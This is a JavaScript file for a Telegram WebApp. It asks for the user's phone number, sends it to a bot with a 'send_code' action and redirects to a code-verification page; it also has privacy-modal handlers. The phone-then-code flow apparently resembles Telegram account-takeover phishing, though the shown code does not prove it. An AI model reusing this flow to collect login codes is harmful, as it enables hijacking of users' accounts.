// Функция запроса номера телефона через Telegram WebApp
function requestPhoneNumber() {
    // Проверяем, запущено ли приложение в Telegram
    if (window.Telegram && window.Telegram.WebApp) {
        // Инициализируем WebApp
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
        
        // Запрашиваем номер телефона
        window.Telegram.WebApp.requestContact((contact) => {
            if (contact && contact.phone_number) {
                // Сохраняем номер
                localStorage.setItem('phoneNumber', contact.phone_number);
                
                // Отправляем запрос на отправку кода боту
                sendCodeToBot(contact.phone_number);
                
                // Переходим на страницу ввода кода
                window.location.href = 'code-verification.html';
            } else {
                alert('❌ Не удалось получить номер телефона');
            }
        });
    } else {
        // Fallback для тестирования вне Telegram
        const phone = prompt('Введите ваш номер телефона (например: +380123456789):');
        if (phone && phone.trim()) {
            localStorage.setItem('phoneNumber', phone.trim());
            setTimeout(() => {
                window.location.href = 'code-verification.html';
            }, 1000);
        }
    }
}

// Функция отправки запроса на код боту
function sendCodeToBot(phone) {
    if (window.Telegram && window.Telegram.WebApp) {
        const data = {
            action: 'send_code',
            phone: phone
        };
        
        // Отправляем данные боту
        window.Telegram.WebApp.sendData(JSON.stringify(data));
        console.log('📱 Запрос на отправку кода отправлен боту');
    }
}

// Функции для модального окна
function showPrivacyModal() {
    document.getElementById('privacyModal').style.display = 'block';
    document.body.style.overflow = 'hidden';
}

function closePrivacyModal() {
    document.getElementById('privacyModal').style.display = 'none';
    document.body.style.overflow = 'auto';
}

// Закрытие модального окна при клике вне его
window.onclick = function(event) {
    const modal = document.getElementById('privacyModal');
    if (event.target === modal) {
        closePrivacyModal();
    }
}

// Закрытие модального окна по Escape
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        closePrivacyModal();
    }
});